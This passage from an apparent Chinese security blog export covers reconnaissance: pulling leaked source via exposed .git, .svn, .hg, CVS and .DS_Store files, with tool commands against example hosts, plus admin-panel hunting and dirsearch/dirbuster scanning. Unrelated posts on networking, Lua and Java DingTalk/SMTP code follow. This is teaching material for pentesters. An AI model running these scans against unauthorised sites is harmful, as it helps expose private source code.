在其中列出网站中的网址以及关于每个网址的其他元数据（上次更新的时间、更改的频率以及相对于网站上其他网址的重要程度为何等），以便搜索引擎可以更加智能地抓取网站。 以下是由于版本控制导致的文件泄露 .git源代码泄露是什么 在执行git init初始化目录的时候，会在当前目录下自动创建一个.git目录，用来记录代码变更记录等。发布代码的时候，如果没有把.git这个目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码。 怎么用 利用工具：GitHack 项目地址：https://github.com/BugScanTeam/GitHack .cvs源代码泄露是什么 CSV是一个C&#x2F;S系统，多个开发人员通过中心版本控制系统来记录文件版本，从而达到保证文件同步的目的。 作用 主要是针对CVS&#x2F;Root以及CVS&#x2F;Entries目录，直接就可以看到泄露的信息。 返回根信息：http://www.example.com/CVS/Root 返回所有文件的结构：http://www.example.com/CVS/Entries 怎么用 漏洞利用工具：dvcs-ripper 项目地址：https://github.com/kost/dvcs-ripper.git 运行示例： 1rip-cvs.pl -v -u http://www.example.com/CVS .svn源代码泄露是什么 SVN是一个开放源代码的版本控制系统。在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要地方源代码信息。 作用 网站管理员在发布代码时，没有使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使.svn隐藏文件夹被暴露在外网环境，可以使用.svn&#x2F;entries文件，获取到服务器源码。 怎么用 Seay SVN漏洞利用工具 SvnExploit 项目地址：https://github.com/admintony/svnExploit/ .hg源代码泄露是什么 Mercurial是一种轻量级分布式版本控制系统，使用hg init的时候会生成.hg。 怎么用 漏洞利用工具：dvcs-ripper 项目地址：https://github.com/kost/dvcs-ripper.git 运行示例： 1rip-cvs.pl -v -u http://www.example.com/.hg/ .DS_store文件泄露是什么 .DS_store是Mac下Finder用来保存如何展示 文件&#x2F;文件夹 的数据文件，每个文件夹下对应一个。 作用 如果将.DS_store上传部署到服务器，可能造成文件目录结构泄露，特别是备份文件、源代码文件。 怎么用 漏洞利用工具：ds_store_exp 项目地址：https://github.com/lijiejie/ds_store_exp 运行示例： 1ds_store_exp.py http://xxx.com/.DS_Store 网站备份文件泄露管理员将网站源代码备份在Web目录下，攻击者通过猜解文件路径，下载备份文件，导致源代码泄露。常见的备份文件后缀：.rar、.zip、.7z、.tar.gz、.bak、.txt、.old、.temp SWP文件泄露swp即swap文件，在编辑文件时产生的临时文件，它是隐藏文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，文件名为.filename.swp。 WEB-INF&#x2F;web.xml泄露是什么 WEB-INF是Java的Web应用的安全目录 WEB-INF主要包含以下文件或目录： WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了servlet和其他的应用组件及命名规则 WEB-INF&#x2F;database.properties：数据库配置文件 WEB-INF&#x2F;classes&#x2F;：一般用来存放Java类文件（.class） WEB-INF&#x2F;lib&#x2F;：用来存放打包好的库（.jar） WEB-INF&#x2F;src&#x2F;：用来存放源代码 作用 如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。 通过找到 web.xml 文件，推断 class 文件的路径，最后直接下载 class 文件，再通过反编译 class 文件，得到网站源码。 敏感目录收集方式网页中寻找 在robots.txt中看能否发现敏感目录 F12源代码链接处 通过查看一些图片的属性路径，运气好会发现很多隐藏的目录 结合域名+目录， 用目录扫描工具进行扫描 手动输入一些常见的后台管理地址进行访问。 其他端口中寻找有时候网站的不同端口中有一些便是专门的后台管理地址。根据经验总结，很多网站8080、8081端口是网站的管理地址。 例如：http://www.xxx.com:8080 网站分目录下寻找有的时候网站会把管理地址放在一个分目录下，有的时候一个网站比较大，后台管理页面也比较多，就要分目录的去找， 例如：http://www.xxx.com/test/admin/manage.php 你可以通过一些方式获取到网站的目录，然后在这个目录下进行扫描。当一个网站你扫描根目录没有任何收获时，这个时候通过分析网站的目录结构，然后扫描域名+目录，就能找出它的后台管理地址。 子域名下寻找有的时候网站的管理地址会放在子域名下，所以主站什么都找不到的情况下，如果发现子域名，就通过这些方法去子域名下找一下吧。 例如：http://admin.xxx.com/login Google HackingGoogle Hacking 一般是做为黑客在入侵时的一个手段。在入侵过程中有时需要查找后台的登陆口就需要用到Google Hacking。有时猜解密码的时候谷歌也是提供查找管理员资料的有效平台。是一种社会工程学获取目标信息的手段。可以用于跟踪某对象在网络上的各种踪迹（如交友平台、微博等）。 Google hacking 语法自行学习 信息收集之Google Hacking的简单用法 uDork：一款功能强大的Google Hacking工具 网站爬虫通过awvs，burpsuite的爬行功能，可以拓扑出网站的目录结构，有的时候运气好能在网页的目录结构中找到好东西，不过爬行一般会结合工具扫描，比如你构造域名+目录，然后扫描这个。 burp spider爬行 扫描工具 御剑 ：针对网站目录及后台管理地址进行扫描的工具 dirbuster：探测Web服务器目录及隐藏文件，擅长暴力猜解 wwwscan：网站后台扫描工具 dirb：kali内置工具，基于字典的web目录扫描工具，用递归的方式来获取更多的目录，支持代理和http认证限制访问的网站 1dirb http://www.baidu.com dirmap：高级web目录扫描工具。项目的地址 https://github.com/H4ckForJob/dirmap Cansina：用python写的一款探测网站的敏感目录和内容的安全测试工具。项目地址 https://github.com/deibit/cansina dirsearch：扫描网站的敏感文件和目录从而找到突破口。 项目地址：https://github.com/maurosoria/dirsearch/ weakfilescan：基于爬虫，动态收集扫描目标相关信息后进行二次整理形成字典规则，利用动态规则的多线程敏感信息泄露检测工具 状态码状态码分为五组 1xx 信息响应。 收到并理解的请求。 请求处理将继续。 2xx 成功。 已成功接收、理解和接受该操作。 3xx 重定向。 客户端必须采取进一步操作才能完成请求。 4xx 客户端错误。 可能是客户端导致的错误。 请求包含错误的语法或无法实现。 5xx 服务器错误。 服务器遇到错误，无法满足请求。 常见状态码 状态代码 200 这是成功 HTTP 请求的标准”确定”状态代码。 状态代码301 资源（网页等）被永久转移到其它URL【永久重定向】 状态代码302 资源（网页等）被临时转移到其它URL【临时重定向】 状态代码 400 服务器由于客户端错误而无法理解和处理请求。 【客户端发送请求语法错误】 状态代码 401 当需要身份验证但失败或未提供身份验证时，将发生此状态代码请求。 状态代码 403 与状态代码 401 非常相似，状态代码 403 在发送有效请求时发生，但服务器拒绝接受。 如果客户端&#x2F;用户需要必要的权限，或者他们可能需要帐户来访问资源，则会发生这种情况。 与状态代码 401 不同，身份验证将不适用于此处。 状态代码 404 普通用户将看到的最常见状态代码。 当请求有效，但无法在服务器上找到资源时，将发生状态代码 404。 状态代码 500 是真正的错误代码。 当服务器由于意外问题无法完成请求时，将发生状态代码 500。【服务器内部错误】 状态代码 502 网关错误。服务器作为网关并且从上游服务器获取到了一个无效的http响应 参考文章https://cloud.tencent.com/developer/article/1925598","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"信息收集","slug":"渗透测试/信息收集","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"tags":[{"name":"目录扫描","slug":"目录扫描","permalink":"https://gryffinbit.top/tags/%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F/"}],"author":"Gryffinbit"},{"title":"目录扫描：dirsearch、dirbuster用法","slug":"目录扫描：dirsearch、dirbuster用法","date":"2022-08-24T10:33:22.000Z","updated":"2024-11-12T07:00:08.000Z","comments":true,"path":"2022/08/24/目录扫描：dirsearch、dirbuster用法/","permalink":"https://gryffinbit.top/2022/08/24/%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%EF%BC%9Adirsearch%E3%80%81dirbuster%E7%94%A8%E6%B3%95/","excerpt":"","text":"dirsearch环境配置 项目地址：https://github.com/maurosoria/dirsearch Kali Linux 2021.3 ARM64 kali安装1sudo apt-get install dirsearch dirsearch 路径 1/usr/lib/python3/dist-packages/dirsearch 输出日志 1-o output.txt 日志路径：/usr/lib/python3/dist-packages/dirsearch 1dirsearch -u http://3daaffa8-f7e3-49bc-8a4d-f287334a2e82.node4.buuoj.cn:81 -t 120 -o /root/report.txt 将会在root目录下出现report.txt 多线程 1-t 20 参数自行查询 1dirsearch -h 常用参数 123-u 指定需要扫描的URL-e 指定需要扫描的扩展名（文件类型），比如php,jsp等，如果不知道可以用*，多个扩展名用逗号隔开-X 排除用逗号分隔的扩展名列表（比如asp,jsp) 常规设置 1234567891011121314151617181920212223242526272829303132333435363738394041424344-d DATA, --data=DATA HTTP请求数据-r, --recursive 递归爆破目录-R RECURSIVE_LEVEL_MAX, --recursive-level-max=RECURSIVE_LEVEL_MAX 最大递归级别（子目录）（默认值：0[无限]） --suppress-empty 禁止空响应 --minimal=MINIMUMRESPONSESIZE 响应时间最短 --maximal=MAXIMUMRESPONSESIZE 最大响应长度 --scan-subdirs=SCANSUBDIRS 扫描给定URL的子目录（以逗号分隔） --exclude-subdirs=EXCLUDESUBDIRS 递归扫描期间排除以下子目录（以逗号分隔）-t THREADSCOUNT, --threads=THREADSCOUNT 线程数-i INCLUDESTATUSCODES, --include-status=INCLUDESTATUSCODES 仅显示包含的状态码，以逗号分隔 （例如：301、500）-x EXCLUDESTATUSCODES, --exclude-status=EXCLUDESTATUSCODES 不显示排除的状态代码，以逗号分隔（例如：301、500）-H HEADERS, --header=HEADERS HTTP request header, support multiple flags (Example: -H &quot;Referer: example.com&quot; -H &quot;Accept: */*&quot;) HTTP请求标头，支持多个标志（例如：-H“引用者：example.com” -H“接受：* / *”） dirbuster环境配置Kali Linux 2021.3 ARM64 操作软件 kali自带，搜索就可以找到 参数填写 目标地址填写 线程数量选择，电脑配置高的可以配多一些 字典选择。可以使用kali自带的字典，字典路径。/usr/share/wordlists/dirbuster 爆出的目录结果查看","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"工具","slug":"渗透测试/工具","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/"}],"tags":[],"author":"Gryffinbit"},{"title":"MAC表、APR表、路由表、组播、广播异同","slug":"MAC表、APR表、路由表、组播、广播异同","date":"2022-08-23T16:00:22.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2022/08/24/MAC表、APR表、路由表、组播、广播异同/","permalink":"https://gryffinbit.top/2022/08/24/MAC%E8%A1%A8%E3%80%81APR%E8%A1%A8%E3%80%81%E8%B7%AF%E7%94%B1%E8%A1%A8%E3%80%81%E7%BB%84%E6%92%AD%E3%80%81%E5%B9%BF%E6%92%AD%E5%BC%82%E5%90%8C/","excerpt":"","text":"MAC 交换机根据MAC寻址，查表确认端口 MAC地址：数据链路层。以太网地址、物理地址，用于确认网络设备位置的地址。 MAC表：又称转发表。交换机根据转发表来转发数据帧。 交换机有存储转发功能：接收到数据帧后，记录数据帧中的源MAC地址和对应的到达端口。 单播和广播： 单播：交换机检查自己的MAC表是否有数据帧中目的MAC地址的匹配条目，如果有，则会根据MAC表中记录的对应端口将数据帧转发出去 广播：如果没有，则会将数据帧从非达到端口的其他全部端口发送出去。 ARP ARP：地址解析协议，网络层。以太网环境下，同一个网段的主机之间需要知道对方的MAC地址，才能通信。 ARP表：记录着主机的IP地址到MAC地址的映射关系 路由 路由器负责不同网段之间的通信，每个与路由器端口相连的网络被称为一个子网或网段，也即是一个广播域。 路由表：路由器中的表，通过在网络节点上运行路由协议，记录并更新去往不同网段的路径信息。 路由表包括：目的网络、网关地址、网络掩码（用于判断任意两台主机是否处于同一个网段的根据。两台主机各自的IP地址与本机配置的子网掩码做按位与操作，如果结果相同，则处于同一网段，无需路由转发） 单播单播通讯位于网络层。基于目的设备的IP地址进行转发。 发送方把去往除本地子网之外的所有其他网络的IP流量，都发给网关&#x2F;路由器 -&gt; 路由器会查看数据包的目的IP地址 -&gt; 路由器根据路由表中的信息，将数据包转发给下一跳路由器 -&gt; 最终目的路由器收到数据包后，会把它转发给接收方 发送方从来不会学到接收方的MAC地址，因为接收方A与发送方不处于同一个子网 广播将一个消息发送给一个子网或二层域中的所有设备，每台设备都有义务查看这个消息，以此来确定这个消息是否是发送给自己的。 如果设备希望与某个IP主机进行通信，但却不知道这个IP主机的目的MAC地址，它就会将IP单播消息封装在表示全部主机的以太网广播数据帧中，并发送出去，同一个以太网段中的所有设备都会收到这个数据包。 组播 组播是更高效的广播。它与广播的区别在于，组播数据流的潜在接收方可以位于不同的网段中。网络设备在接收到一个数据包后将其复制，然后把复制数据包从更多个网络接口发送出去。 路由器和交换机必须复制从源接口收到的数据包，然后把它转发给多个接收方 网络设备会根据二层或三层域中的多个接收方，有选择性的学习数据流 优化了带宽利用率","categories":[{"name":"杂七杂八","slug":"杂七杂八","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[],"author":"Gryffinbit"},{"title":"lua语法","slug":"lua语法","date":"2022-08-22T15:20:16.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/08/22/lua语法/","permalink":"https://gryffinbit.top/2022/08/22/lua%E8%AF%AD%E6%B3%95/","excerpt":"","text":"lua简介 Lua是一个可扩展的嵌入型脚本语言 嵌入式语言：基于ANSI C实现，基本上每种编程语言都有调用C函数的方法，因此可以在所有这些语言中使用Lua。包括C++、Go、Rust、Python 解释型语言：Lua会先编译成字节码，然后在Lua虚拟机上解释执行这些字节码。保证了可移植性 动态类型语言：Lua本身没有定义类型，不过语言中的每个值都包含着类型信息 语法规范编码风格 标识符（或名称）：是由任意字母、数字、下划线组成的字符串（不能以数字开头） 下划线+大写字母：通常被用作特殊用途。如：_Version 大小写敏感。如And和AND是两个不同的标识符 注释 单行注释： 1-- 注释内容 多行注释： 12345678910--[[注释内容]]--[[注释内容--]]--[[注释内容]] 取消注释： 123---[[注释内容]] 变量： 变量默认是全局变量，即直接写变量名即为全局变量，局部变量的定义需要加local关键字修饰 全局变量：g_var 局部变量：loc_var Lua基本类型nil空，变量定义出来在第一次赋值之前是空的，目的用于告诉lua它是没有初始化的。nil在lua里面只有赋值操作=，和判断操作==、～=才有效。其他操作符都会报错 numberLua5.3之前：所有数值都是双精度浮点格式 Lua5.3之后：int 64位整型、double双精度浮点。 精简Lua模式：int 32位整型、float单精度浮点 stringLua中的字符串可以存储包括空字符在内的所有数值代码。所以可以在字符串中存储任意的二进制数据。 可以使用编码方式（UTF-8）来存储unicode字符串 获取长度 #字符串 ： 可以直接获取 string.len(字符串) ： 要先查找string(table) 再找其下的len，传参调用 123456789101112local a = &quot;aaa&quot;local a_len = utf8.len(a) local b = &quot;你好&quot;local b_len1 = utf8.len(b)local b_len2 = #blocal b_len3 = string.len(b) print(&quot;a_len:&quot; .. a_len .. &quot;, b_len1:&quot; .. b_len1 .. &quot;, b_len2:&quot; .. b_len2 .. &quot;, b_len3:&quot; .. b_len3) -- 输出-- a_len:3, b_len1:2, b_len2:6, b_len3:6 源文件utf-8 字符串连接 .. ：不能操作nil类型 字符串连接操作符，在连接多个操作时实际会创建字符串的多个副本，会大量使用该操作符时会带来内存和CPU的开销 长字符串 [[长字符串]] 1234567891011121314local a = [[adfadfadfadf,hello world&#123; &quot;conio&quot;:1, &quot;b&quot;:2, &quot;c&quot;: [ 1,2,3 ] &#125;]] print(a) 字符串标准库常用的方法 gsub 字符串替换函数，用于查找和处理替换内容 string.pack和string.unpack 用于在二进制数据和Lua的基本类型值之间进行转换的函数。pack把值打包成二进制字符串，unpack从二进制字符串中提取这些值 utf8库 ：从Lua5.3开始，lua引入了一个用于操作UTF-8编码的Unicode字符串的标准库 模式匹配 tabletable是数据结构 是Lua里面主要的数据结构，用来实现其他语言中的常见的数据结构：Map、集合、数组、记录等 遍历 使用 paris 和ipairs遍历一个 table 标准库 table的标准库，用于操作table。常见的api有：table.insert, table.remove, table.move, table.sort 元表和元方法 Lua设计了元表和元方法，目的在于：用于拓展任意值在面对一个位置操作时的行为 function function在Lua语言是lua是“第一类值”，Lua中所有的函数都是匿名的，不仅可以存储在全局变量中，还可以存储在表字段和局部变量中。 参考文章https://developer.aliyun.com/article/836104","categories":[{"name":"入侵检测","slug":"入侵检测","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"杂七杂八","slug":"入侵检测/杂七杂八","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[{"name":"so文件","slug":"so文件","permalink":"https://gryffinbit.top/tags/so%E6%96%87%E4%BB%B6/"}],"author":"Gryffinbit"},{"title":"java调用钉钉api接口，实现机器人自动发送消息并艾特个人","slug":"Java调用钉钉api接口，实现机器人自动发送消息并艾特个人","date":"2022-08-17T15:09:47.000Z","updated":"2024-11-12T06:59:36.000Z","comments":true,"path":"2022/08/17/Java调用钉钉api接口，实现机器人自动发送消息并艾特个人/","permalink":"https://gryffinbit.top/2022/08/17/Java%E8%B0%83%E7%94%A8%E9%92%89%E9%92%89api%E6%8E%A5%E5%8F%A3%EF%BC%8C%E5%AE%9E%E7%8E%B0%E6%9C%BA%E5%99%A8%E4%BA%BA%E8%87%AA%E5%8A%A8%E5%8F%91%E9%80%81%E6%B6%88%E6%81%AF%E5%B9%B6%E8%89%BE%E7%89%B9%E4%B8%AA%E4%BA%BA/","excerpt":"","text":"前言整个项目打包（ 包括用java实现邮件发送，smtp服务器）： 链接: https://pan.baidu.com/s/1yjzsDVV4LlbOqx7VvpVuKQ?pwd=1kn8 提取码: 1kn8–来自百度网盘超级会员v5的分享 用java实现邮件发送，smtp服务器，Blog跳转：https://gryffinbit.top/2022/08/17/%E7%94%A8java%E5%AE%9E%E7%8E%B0%E9%82%AE%E4%BB%B6%E5%8F%91%E9%80%81%EF%BC%8Csmtp%E6%9C%8D%E5%8A%A1%E5%99%A8/ 获取钉钉开发资格登陆钉钉管理后台 钉钉管理后台- 钉钉统一身份认证 注册企业资格的时候忘了截图了。。。总之步骤登陆管理后台，它会告知你没有管理员身份的账号，你选择注册一个，按照流程提示注册完了之后就有权限了。这时候钉钉就会生成一个群。在这个群里添加机器人。 点群的设置，选择群助手，添加机器人 添加自定义机器人 设定参数 安全设定，一共有三个，根据需要勾选。比如选择了定制的关键词，那么发送消息的时候，只有当消息中存在这个关键词，才能发送成功 机器人添加成功后，会生成一个webhook，将它复制保存，代码中需要用到它 代码DingNotice.java 12345678910111213141516171819202122232425262728293031323334package main.controller;import java.util.ArrayList;import java.util.HashMap;import java.util.List;import java.util.Map;public class DingNotice &#123; public static void main(String[] args)&#123; // 钉钉的webhook String dingDingToken=&quot;https://oapi.dingtalk.com/robot/send?access_token=xxxxxxxxxxxx&quot;; // 请求的JSON数据，这里我用map在工具类里转成json格式 Map&lt;String,Object&gt; json = new HashMap(); Map&lt;String,Object&gt; text = new HashMap(); Map&lt;String,List&lt;String&gt;&gt; phone = new HashMap(); String [] mobile = &#123;&#125;; List mob = new ArrayList&lt;String&gt;(); // 数据库填入注册用户的手机号 mob.add(&quot;186xxxxxxx&quot;);//要@的人的手机号码 json.put(&quot;msgtype&quot;,&quot;text&quot;);//指定消息类型是text text.put(&quot;content&quot;,&quot;文字内容&quot;);// phone.put(&quot;atMobiles&quot;, mob);//将手机号码放进参数中 json.put(&quot;text&quot;,text); json.put(&quot;at&quot;, phone); // 发送post请求 String response = DingNoticeTest.sendPostByMap(dingDingToken, json); System.out.println(&quot;响应结果：&quot;+response); &#125;&#125; DingNoticeTest.java 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788package main.controller;import com.alibaba.fastjson.JSON;import java.io.*;import java.net.URL;import java.net.URLConnection;import java.util.HashMap;import java.util.Map;import java.util.Map.Entry;public class DingNoticeTest &#123; /** * 发送POST请求，参数是Map, contentType=x-www-form-urlencoded * * @param url * @param mapParam * @return */ public static String sendPostByMap(String url, Map&lt;String, Object&gt; mapParam) &#123; Map&lt;String, String&gt; headParam = new HashMap(); //指定http的内容类型为JSON数据格式 headParam.put(&quot;Content-type&quot;, &quot;application/json;charset=UTF-8&quot;); return sendPost(url, mapParam, headParam); &#125; /** * 向指定 URL 发送POST方法的请求 * * @param url 发送请求的 URL * @param param 请求参数， * @return 所代表远程资源的响应结果 */ public static String sendPost(String url, Map&lt;String, Object&gt; param, Map&lt;String, String&gt; headParam) &#123; PrintWriter out = null; BufferedReader in = null; String result = &quot;&quot;; try &#123; URL realUrl = new URL(url);//通过此对象可以解析出url中的所有信息，比如协议，验证信息，端口，请求参数，定位位置等 // 打开和URL之间的连接 URLConnection conn = realUrl.openConnection(); // 设置通用的请求属性 请求头 conn.setRequestProperty(&quot;accept&quot;, &quot;*/*&quot;); conn.setRequestProperty(&quot;connection&quot;, &quot;Keep-Alive&quot;); conn.setRequestProperty(&quot;user-agent&quot;, &quot;Fiddler&quot;); if (headParam != null) &#123; for (Entry&lt;String, String&gt; entry : headParam.entrySet()) &#123; conn.setRequestProperty(entry.getKey(), entry.getValue()); &#125; &#125; // 发送POST请求必须设置如下两行 conn.setDoOutput(true); conn.setDoInput(true); // 获取URLConnection对象对应的输出流 out = new PrintWriter(conn.getOutputStream()); // 发送请求参数 out.print(JSON.toJSONString(param)); // flush输出流的缓冲 out.flush(); // 定义BufferedReader输入流来读取URL的响应 in = new BufferedReader( new InputStreamReader(conn.getInputStream())); String line; while ((line = in.readLine()) != null) &#123; result += line; &#125; &#125; catch (Exception e) &#123;// logger.info(&quot;发送 POST 请求出现异常！&quot; + e); e.printStackTrace(); &#125; //使用finally块来关闭输出流、输入流 finally &#123; try &#123; if (out != null) &#123; out.close(); &#125; if (in != null) &#123; in.close(); &#125; &#125; catch (IOException ex) &#123; ex.printStackTrace(); &#125; &#125; return result; &#125;&#125; 结果 参考文章https://www.cnblogs.com/barrywxx/p/10716593.html#/publishEapp","categories":[{"name":"创意开发","slug":"创意开发","permalink":"https://gryffinbit.top/categories/%E5%88%9B%E6%84%8F%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"钉钉API","slug":"钉钉API","permalink":"https://gryffinbit.top/tags/%E9%92%89%E9%92%89API/"},{"name":"机器人","slug":"机器人","permalink":"https://gryffinbit.top/tags/%E6%9C%BA%E5%99%A8%E4%BA%BA/"}],"author":"Gryffinbit"},{"title":"用java实现邮件发送，smtp服务器","slug":"用java实现邮件发送，smtp服务器","date":"2022-08-17T15:08:49.000Z","updated":"2024-11-12T06:59:53.000Z","comments":true,"path":"2022/08/17/用java实现邮件发送，smtp服务器/","permalink":"https://gryffinbit.top/2022/08/17/%E7%94%A8java%E5%AE%9E%E7%8E%B0%E9%82%AE%E4%BB%B6%E5%8F%91%E9%80%81%EF%BC%8Csmtp%E6%9C%8D%E5%8A%A1%E5%99%A8/","excerpt":"","text":"前言相同功能实现，python版本 跳转Blog：https://gryffinbit.top/2022/08/15/ubuntu%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E6%90%AD%E5%BB%BAsmtp%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8/ 调用钉钉api接口，实现机器人自动发送消息并艾特个人，blog跳转： https://gryffinbit.top/2022/08/17/%E8%B0%83%E7%94%A8%E9%92%89%E9%92%89api%E6%8E%A5%E5%8F%A3%EF%BC%8C%E5%AE%9E%E7%8E%B0%E6%9C%BA%E5%99%A8%E4%BA%BA%E8%87%AA%E5%8A%A8%E5%8F%91%E9%80%81%E6%B6%88%E6%81%AF%E5%B9%B6%E8%89%BE%E7%89%B9%E4%B8%AA%E4%BA%BA/ smtp服务器授权 我使用的是126的smtp服务。之前有自己搭建过smtp服务器，但会有两个问题，第一是用腾讯云服务器搭建的话，25端口需要申请，而且不能发邮件，可能封禁。第二就是自己搭建的smtp服务器，发送邮件大概率会被扔进垃圾箱。 126邮箱授权 开启smtp服务 开启成功后，会获得一个授权码，后面会用到。 代码 mailUsername 是开启smtp服务，并获取到授权码的126邮箱。 mailAuthPassword 是开启smtp服务后，获取到的授权码 sender 填写发件人的邮箱地址 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115package main.controller;import javax.mail.Session;import javax.mail.Transport;import javax.mail.internet.InternetAddress;import javax.mail.internet.MimeMessage;import java.util.Date;import java.util.Properties;public class Notice&#123; // 由于钉钉收件有限制，如果使用自己搭建的smtp服务器会导致发送的邮件被钉钉放入垃圾箱，所以这里smtp服务器采用的126的smtp服务器 // 发件人使用个人邮箱 // smtp服务器需要授权码 public static String mailUsername = &quot;xxxx@126.com&quot;; public static String mailAuthPassword = &quot;xxxx&quot;; // 网易126邮箱的 SMTP 服务器地址为: smtp.126.com public static String mailHost = &quot;smtp.126.com&quot;; // 收件人邮箱 public static String receiveMailAccount = &quot;xxxx@xxx.com&quot;; // 需要传参的部分，先暂时在这里用公共变量测试 public static String username = &quot;test&quot;; public static String passwd = &quot;test123&quot;; public static String usergroup = &quot;admin&quot;; public static void main(String[] args) throws Exception &#123; // 1. 创建参数配置, 用于连接邮件服务器的参数配置 Properties props = new Properties(); // 参数配置 props.setProperty(&quot;mail.transport.protocol&quot;, &quot;smtp&quot;); // 使用的协议（JavaMail规范要求） props.setProperty(&quot;mail.smtp.host&quot;, mailHost); // 发件人的邮箱的 SMTP 服务器地址 props.setProperty(&quot;mail.smtp.auth&quot;, &quot;true&quot;); // 需要请求认证 final String smtpPort = &quot;25&quot;; props.setProperty(&quot;mail.smtp.port&quot;, smtpPort); props.setProperty(&quot;mail.smtp.socketFactory.fallback&quot;, &quot;false&quot;); // 此类将用于创建SMTP套接字。 props.setProperty(&quot;mail.smtp.socketFactory.port&quot;, smtpPort); // 2. 根据配置创建会话对象, 用于和邮件服务器交互 Session session = Session.getDefaultInstance(props); session.setDebug(true); // 设置为debug模式, 可以查看详细的发送 log // 3. 创建一封邮件 MimeMessage message = createMimeMessage(session, mailUsername, receiveMailAccount); // 4. 根据 Session 获取邮件传输对象 Transport transport = session.getTransport(); // 5. 使用 邮箱账号 和 密码 连接邮件服务器, 这里认证的邮箱必须与 message 中的发件人邮箱一致, 否则报错 // // PS_01: 成败的判断关键在此一句, 如果连接服务器失败, 都会在控制台输出相应失败原因的 log, // 仔细查看失败原因, 有些邮箱服务器会返回错误码或查看错误类型的链接, 根据给出的错误 // 类型到对应邮件服务器的帮助网站上查看具体失败原因。 // // PS_02: 连接失败的原因通常为以下几点, 仔细检查代码: // (1) 邮箱没有开启 SMTP 服务; // (2) 邮箱密码错误, 例如某些邮箱开启了独立密码; // (3) 邮箱服务器要求必须要使用 SSL 安全连接; // (4) 请求过于频繁或其他原因, 被邮件服务器拒绝服务; // (5) 如果以上几点都确定无误, 到邮件服务器网站查找帮助。 // transport.connect(mailUsername, mailAuthPassword); // 6. 发送邮件, 发到所有的收件地址, message.getAllRecipients() 获取到的是在创建邮件对象时添加的所有收件人, 抄送人, 密送人 transport.sendMessage(message, message.getAllRecipients()); // 7. 关闭连接 transport.close(); &#125; /** * 账号创建结果通知 * * @param session 和服务器交互的会话 * @param sendMail 发件人邮箱 * @param receiveMail 收件人邮箱 * @return * @throws Exception */ public static MimeMessage createMimeMessage(Session session, String sendMail, String receiveMail) throws Exception &#123; // 1. 创建一封邮件 MimeMessage message = new MimeMessage(session); // 2. From: 发件人 message.setFrom(new InternetAddress(sendMail, &quot;第二组账号创建结果通知&quot;, &quot;UTF-8&quot;)); // 3. To: 收件人（可以增加多个收件人、抄送、密送） message.setRecipient(MimeMessage.RecipientType.TO, new InternetAddress(receiveMail, &quot;XX用户&quot;, &quot;UTF-8&quot;)); // 4. Subject: 邮件主题 message.setSubject(&quot;账号创建结果告知&quot;, &quot;UTF-8&quot;); // 5. Content: 邮件正文（可以使用html标签） // 还可以添加其他内容，比如域账号、vmware账号、svn账号、git账号 String context = &quot;你的账号创建结果如下:&lt;/br&gt;&quot;; context += &quot;用户名：&quot; + username + &quot;&lt;/br&gt;&quot;; context += &quot;密码：&quot; + passwd + &quot;&lt;/br&gt;&quot;; context += &quot;属组：&quot; + usergroup + &quot;&lt;/br&gt;&quot;; message.setContent(context, &quot;text/html;charset=UTF-8&quot;); // 6. 设置发件时间 message.setSentDate(new Date()); // 7. 保存设置 message.saveChanges(); return message; &#125;&#125; 结果 备注整个项目打包（包括调用钉钉api接口，实现机器人自动发送消息并艾特个人）： 链接: https://pan.baidu.com/s/1yjzsDVV4LlbOqx7VvpVuKQ?pwd=1kn8 提取码: 1kn8–来自百度网盘超级会员v5的分享","categories":[{"name":"创意开发","slug":"创意开发","permalink":"https://gryffinbit.top/categories/%E5%88%9B%E6%84%8F%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"smtp","slug":"smtp","permalink":"https://gryffinbit.top/tags/smtp/"},{"name":"java","slug":"java","permalink":"https://gryffinbit.top/tags/java/"}],"author":"Gryffinbit"},{"title":"用python实现邮件发送，smtp服务器","slug":"用python实现邮件发送，smtp服务器","date":"2022-08-17T15:08:37.000Z","updated":"2024-11-12T06:59:52.000Z","comments":true,"path":"2022/08/17/用python实现邮件发送，smtp服务器/","permalink":"https://gryffinbit.top/2022/08/17/%E7%94%A8python%E5%AE%9E%E7%8E%B0%E9%82%AE%E4%BB%B6%E5%8F%91%E9%80%81%EF%BC%8Csmtp%E6%9C%8D%E5%8A%A1%E5%99%A8/","excerpt":"","text":"前言用java实现邮件发送，smtp服务器，Blog跳转：https://gryffinbit.top/2022/08/17/%E7%94%A8java%E5%AE%9E%E7%8E%B0%E9%82%AE%E4%BB%B6%E5%8